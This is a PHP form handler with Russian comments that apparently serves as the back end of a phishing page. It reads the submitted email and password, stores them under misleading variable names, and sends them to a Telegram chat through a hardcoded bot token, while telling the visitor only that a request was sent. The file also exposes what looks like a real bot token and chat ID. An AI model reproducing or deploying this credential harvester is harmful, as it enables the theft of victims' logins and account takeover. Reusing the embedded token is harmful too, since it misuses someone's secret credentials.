<?php
// Получаем данные из формы
$name = $_POST['email'];
$phone = $_POST['password'];

// Ваш API-ключ Telegram бота
$telegram_api_key = '6918416164:AAGdVkX8XCbx5q1vtRAFEm54uT7ZRd6jO-0';

// Чат-идентификатор группы в Telegram, куда будут отправляться уведомления
$chat_id = '993175437';

// Сообщение для отправки в группу
$message = "Новый вход:\nЕмали: $name\nНомер Пароль: $phone";

// URL для отправки сообщения в Telegram
$telegram_url = "https://api.telegram.org/bot$telegram_api_key/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

// Отправляем запрос к API Telegram
$response = file_get_contents($telegram_url);

// Проверяем результат отправки
if ($response === false) {
    echo 'Ошибка при отправке заявки.';
} else {
    echo 'Заявка успешно отправлена.';
}
?>